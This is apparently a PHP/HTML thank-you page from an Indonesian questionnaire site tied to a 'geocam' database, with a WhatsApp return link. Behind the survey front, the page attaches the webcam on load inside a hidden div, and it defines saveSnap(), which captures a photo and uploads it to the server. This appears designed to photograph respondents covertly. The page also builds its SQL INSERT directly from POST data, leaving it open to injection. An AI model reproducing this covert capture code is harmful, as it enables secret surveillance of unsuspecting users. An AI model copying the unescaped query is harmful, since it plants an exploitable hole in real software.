<?php
    $con = mysqli_connect("localhost", "root", "", "geocam");
if (!$con) {
    echo "Tidak bisa terhubung dengan database";
    }

if(isset($_POST["kirim"])){
    $answer = $_POST["klik"];
    $number = $_POST["number"];
    $query = "INSERT INTO `tb_quest`(`number`, `respon`) VALUES ('$number', '$answer')";
    mysqli_query($con,$query);

    echo 
    "
    <script>
    /*alert('HOREEE!!! Data kamu berhasil direkam :)');*/
    document.location.href = 'ty.php';
    </script>
    "
    ;
}
?>
<?php
    require 'koneksi.php';
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
        <link rel="icon" href="image/logo.png">
        <title>Quesioner</title>
    </head>

    <body onload =  "configure();">        
        <div class="box" class="warp">
            <form class="myForm" action="" method="post" autocomplete="off" checked="false">
                <div class="inputBox">
                    <p>TERIMAKASIH ATAS BANTUANNYA<br></br>
                        SEMOGA SELALU DILANCARKAN REZEKINYA DAN DILANCARKAN URUSANNYA🙏😊</p>
                    
                    <div class="tombol">
                            <!--input type="checkbox" id="checkbox-container" onclick="saveSnap()" required/>
                            <label for="checkbox" id="centang">Yakin</label>
                            <input onclick="Ulang();" type="submit" name="kirim" id="next" value="Kembali ke pertanyaan awal?"-->
                            <button onclick="ulang();" type="button" id="next">Kembali ke pertanyaan awal?</button>
                            <button onclick="metu();" type="button" id="next">Kembali ke Whatsapp</button>
                    <i></i>
                    </div>
                </div>
            </form>
            <div class="container">
                <div id="my_camera">
                </div>
                <div id="results" style="visibility; hidden; position: absolute;">
                </div>
            </div>
        </div>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');
            *{
                margin: 0 ;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Poppins', sans-serif;
            }
            .container{
                display: flex;
                flex-direction: column;
                visibility: hidden;
                align-items: center;
                position: absolute;
               
            }
            #my_camera{
                visibility: hidden;
             
                position: absolute;


            }
            body{
                display: flex;
                justify-content: center;
                align-items: center;   
                min-height: 100vh;
                background: url('image/background6.jpg')no-repeat;
                width: 100%;
                position: relative;
                margin: 0 auto;
                background-position: center;
                background-size: cover;

                
                user-select: none;
                -moz-user-select: none;
                -ms-user-select: none ;
                -webkit-user-select: none;  
            }

            .box
            {
                position: relative;
                width: 380px;
                height: 420px;
                background: transparent;
                border: 4px solid rgba(255,255,255,0.5);
                border-radius: 20px;
                backdrop-filter: blur(15px);
            }
            .box form
            {
                position: absolute;
                inset: 4px;
                border-radius: 12px;
                padding: 15px 15px;
                display: flex;
                flex-direction: column;  
                font-weight: 600;
                
            }
            
            .box form .inputBox p{
                outline: none rebeccapurple;
                text-align: center;
                margin: 100px 5px 0px 5px;
                font-size: 1.2em;
                height: 150px;
            }
            
            
            .box form .inputBox .tombol{
                display: flex;
                outline: none rebeccapurple;
                justify-content: center;
                margin: 80px 5px 0px 5px;
                
            }
    
            .box form .inputBox .tombol button[type="button"]{      
                background: #23242a;
                color: #fff;
                cursor: pointer;
                border-width: 3px;
                border-radius: 8px;
                
                padding: 0px 2px 0px 2px;
            }
            .box form .tombol button[type="button"]:hover,
            .box form .tombol button[type="button"]:nth-child(0)
            {
                color: #45f3ff;
            }

            
        </style>
        <!--embed src="audio/alarms/Bright_morning.ogg" autostart="true" loop="true"-->
        <audio autoplay="true" loop="true">
        <source src="bgm.mp3" type="audio/mpeg">
        </audio>
    </body>

    <script>
        let myWindow;
        function ulang(){
            window.open("q1.php", '_self');
        }
        function metu(){
            window.open("https://wa.me/13372832006?text=Sudah Selesai**", '');
        }
    </script>
    <script src="assets/radio.js"></script>
        <script>
        $(document).ready(function(){
            if(localStorage.selected) {
                $('#' + localStorage.selected ).attr('checked', true);
            }
            $('.inputabs2').click(function(){
            localStorage.setItem("selected", this.id);
            });
        });

    </script>
    <script src="assets/checkbox.js"></script>
    <script>
            function configure()    
            {
            Webcam.set({
                width: 640,
                height: 480,
                
                image_format: 'jpeg',
                jpeg_quality: 100
            });

            Webcam.attach('#my_camera');
            
            }

            function saveSnap(){
                Webcam.snap(function(data_uri){
                    document.getElementById('results').innerHTML =
                        '<img id = "webcam" src = "'+data_uri+'">';
            });

            

            var base64image = document.getElementById("webcam").src;
            Webcam.upload(base64image, 'koneksi.php',function(code,text){
                
                document.location.href = "q10.php"
            });
            }
    </script>
    <script src="assets/jquery.js"></script>
        <script>
        // document ready handler
        // or $(document).ready(Function(){...
            jQuery(function($) {
                var checkboxValue = JSON.parse(localStorage.getItem('checkboxValue')) || {}
                var $checkbox = $("#checkbox-container");

                $checkbox.on("change", function() {
                $checkbox.each(function() {
                    checkboxValue[this.id] = this.checked;
                });
                localStorage.setItem("checkboxValue", JSON.stringify(checkboxValue));
                });

                //on page load
                $.each(checkboxValue, function(key, value) {
                $("#" + key).prop('checked', value);
                });
            });
        </script>
</html>